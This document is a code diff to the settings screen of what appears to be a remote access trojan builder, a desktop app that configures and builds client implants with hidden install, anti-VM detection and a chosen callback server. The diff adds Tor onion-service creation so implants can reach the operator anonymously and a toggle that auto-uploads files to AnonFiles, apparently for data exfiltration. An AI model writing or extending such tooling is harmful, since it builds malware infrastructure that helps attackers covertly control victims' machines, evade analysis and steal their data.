@@ -21,15 +21,18 @@ import {
   IconCodeCircle,
   IconEyeglassOff,
   IconEyeClosed,
+  IconWifi,
+  IconCloudPlus,
+  IconRefresh,
 } from "@tabler/icons-react";
 
 import { RATContext } from "../rat/RATContext";
-import { AssemblyInfo } from "../../types";
+import { AssemblyInfo, OnionServiceInfo } from "../../types";
 import { invoke } from "@tauri-apps/api/core";
-import { buildClientCmd } from "../rat/RATCommands";
+import { buildClientCmd, createOnionCmd, initTorCmd, setAutoUploadAnonFilesCmd } from "../rat/RATCommands";
 
 export const Settings = () => {
-  const { setNotificationClient, notificationClient } = useContext(RATContext)!;
+  const { setNotificationClient, notificationClient, autoUploadAnonFiles, setAutoUploadAnonFiles } = useContext(RATContext)!;
 
   const [currentStep, setCurrentStep] = useState(0);
   // const [enableAutoSave, setEnableAutoSave] = useState(false);
@@ -38,6 +41,8 @@ export const Settings = () => {
 
   const [buildIp, setBuildIp] = useState<string>("127.0.0.1");
   const [buildPort, setBuildPort] = useState<string>("1337");
+  const [useTor, setUseTor] = useState<boolean>(false);
+  const [torAddress, setTorAddress] = useState<string>("");
 
   const [installFileName, setInstallFileName] = useState<string>("");
   const [installFolder, setInstallFolder] = useState<string>("appdata");
@@ -68,6 +73,38 @@ export const Settings = () => {
 
   const [iconData, setIconData] = useState<string>("");
 
+  const [onionServices, setOnionServices] = useState<OnionServiceInfo[]>([]);
+  const [isInitializingTor, setIsInitializingTor] = useState(false);
+
+  useEffect(() => {
+    initTorCmd()
+      .then(setOnionServices)
+      .catch((e) => {
+        console.error("Failed to initialize Tor services", e);
+        setOnionServices([]);
+      });
+  }, []);
+
+  const handleCreateOnion = async () => {
+    const parsedPort = parseInt(buildPort, 10);
+    if (isNaN(parsedPort) || parsedPort < 1 || parsedPort > 65535) {
+      console.error("Invalid server port for onion creation");
+      return;
+    }
+
+    setIsInitializingTor(true);
+    try {
+      const newOnion = await createOnionCmd(`onion-${Date.now()}`, parsedPort);
+      setOnionServices((prev) => [...prev, newOnion]);
+      setTorAddress(newOnion.onion_address);
+      setUseTor(true);
+    } catch (e) {
+      console.error(e);
+    } finally {
+      setIsInitializingTor(false);
+    }
+  };
+
   useEffect(() => {
     if (iconPath) {
       invoke("read_icon", { path: iconPath }).then((data) => {
@@ -86,6 +123,7 @@ export const Settings = () => {
 
   const steps = [
     { name: "Connection", icon: <IconServerCog /> },
+    { name: "Tor", icon: <IconWifi /> },
     { name: "Install", icon: <IconFolder /> },
     { name: "Misc", icon: <IconSettings /> },
     { name: "Assembly", icon: <IconCodeCircle /> },
@@ -120,6 +158,32 @@ export const Settings = () => {
                     }`}
                   >
                     {notificationClient ? (
+                      <IconToggleRight size={24} />
+                    ) : (
+                      <IconToggleLeft size={24} />
+                    )}
+                  </button>
+                </div>
+
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center">
+                    {autoUploadAnonFiles ? (
+                      <IconCloudPlus className="mr-2 text-green-400" size={20} />
+                    ) : (
+                      <IconCloudPlus className="mr-2 text-gray-400" size={20} />
+                    )}
+                    <span>AnonFiles Auto-Upload</span>
+                  </div>
+                  <button
+                    onClick={() => {
+                      setAutoUploadAnonFiles(!autoUploadAnonFiles);
+                      setAutoUploadAnonFilesCmd(!autoUploadAnonFiles);
+                    }}
+                    className={`p-1 rounded-lg cursor-pointer ${
+                      autoUploadAnonFiles ? "bg-green-700" : "bg-gray-700"
+                    }`}
+                  >
+                    {autoUploadAnonFiles ? (
                       <IconToggleRight size={24} />
                     ) : (
                       <IconToggleLeft size={24} />
@@ -191,20 +255,71 @@ export const Settings = () => {
                       />
                     </div>
                   </div>
-                  {/* <div className="flex flex-col space-y-2">
-                    <label className="text-sm text-gray-400">
-                      Backup Server (Optional)
-                    </label>
-                    <input
-                      type="text"
-                      className="bg-primarybg border border-accentx rounded-lg p-2 text-white"
-                      placeholder="hostname:port or IP:port"
-                    />
-                  </div> */}
                 </div>
               )}
 
               {currentStep === 1 && (
+                <div className="space-y-4">
+                  <h3 className="text-lg font-medium">Tor Settings</h3>
+
+                  <div className="flex items-center justify-between mb-4">
+                    <div className="flex items-center">
+                      <IconWifi className="mr-2 text-purple-400" size={20} />
+                      <span>Use Tor (NAT Penetration)</span>
+                    </div>
+                    <button
+                      onClick={() => setUseTor(!useTor)}
+                      className={`p-1 rounded-lg cursor-pointer ${
+                        useTor ? "bg-blue-700" : "bg-gray-700"
+                      }`}
+                    >
+                      {useTor ? (
+                        <IconToggleRight size={24} />
+                      ) : (
+                        <IconToggleLeft size={24} />
+                      )}
+                    </button>
+                  </div>
+
+                  {useTor && (
+                    <div className="space-y-4 pl-4 border-l-2 border-purple-600">
+                      <div className="flex flex-col space-y-2">
+                        <label className="text-sm text-gray-400">
+                          Onion Address
+                        </label>
+                        <div className="flex space-x-2">
+                          <select
+                            className="flex-1 bg-primarybg border border-accentx rounded-lg p-2 text-white"
+                            value={torAddress}
+                            onChange={(e) => setTorAddress(e.target.value)}
+                          >
+                            <option value="">Select an onion address</option>
+                            {onionServices.map((s) => (
+                              <option key={s.nickname} value={s.onion_address}>
+                                {s.nickname} ({s.onion_address})
+                              </option>
+                            ))}
+                          </select>
+                          <button
+                            onClick={handleCreateOnion}
+                            disabled={isInitializingTor}
+                            className="bg-blue-700 hover:bg-blue-600 p-2 rounded-lg disabled:opacity-50"
+                            title="Generate New Onion"
+                          >
+                            {isInitializingTor ? (
+                              <IconRefresh className="animate-spin" size={20} />
+                            ) : (
+                              <IconCloudPlus size={20} />
+                            )}
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                  )}
+                </div>
+              )}
+
+              {currentStep === 2 && (
                 <div className="space-y-4">
                   <h3 className="text-lg font-medium">Installation Options</h3>
 
@@ -285,7 +400,7 @@ export const Settings = () => {
                 </div>
               )}
 
-              {currentStep === 2 && (
+              {currentStep === 3 && (
                 <div className="space-y-4">
                   <h3 className="text-lg font-medium">
                     Miscellaneous Settings
@@ -403,7 +518,7 @@ export const Settings = () => {
                 </div>
               )}
 
-              {currentStep === 3 && (
+              {currentStep === 4 && (
                 <div className="space-y-4">
                   <h3 className="text-lg font-medium">Assembly Information</h3>
 
@@ -572,7 +687,7 @@ export const Settings = () => {
                 </div>
               )}
 
-              {currentStep === 4 && (
+              {currentStep === 5 && (
                 <div className="space-y-4">
                   <h3 className="text-lg font-medium">Icon Settings</h3>
 
@@ -640,7 +755,7 @@ export const Settings = () => {
                 </div>
               )}
 
-              {currentStep === 5 && (
+              {currentStep === 6 && (
                 <div className="space-y-6">
                   <div className="bg-black/30 rounded-xl p-4 mb-6">
                     <div className="flex items-center justify-between">
@@ -709,7 +824,12 @@ export const Settings = () => {
                     <div className="text-white space-y-1 text-sm">
                       <p>
                         <span className="text-gray-400">Connection:</span>{" "}
-                        {buildIp}:{buildPort}
+                        {useTor ? torAddress : `${buildIp}:${buildPort}`}
+                        {useTor && (
+                          <span className="text-xs text-purple-400 ml-2">
+                            (Tor Enabled)
+                          </span>
+                        )}
                       </p>
                       {enableInstall && (
                         <p>
@@ -807,6 +927,12 @@ export const Settings = () => {
                 <button
                   className="cursor-pointer bg-green-700 hover:bg-green-600 text-white py-2 px-4 rounded-lg flex items-center"
                   onClick={() => {
+                    if (useTor && !torAddress) {
+                      console.error(
+                        "Select or create an onion address before building with Tor."
+                      );
+                      return;
+                    }
                     buildClientCmd(
                       buildIp,
                       buildPort,
@@ -821,7 +947,9 @@ export const Settings = () => {
                       installFileName,
                       group,
                       enableHidden,
-                      antiVmDetection
+                      antiVmDetection,
+                      useTor,
+                      torAddress
                     );
                   }}
                 >
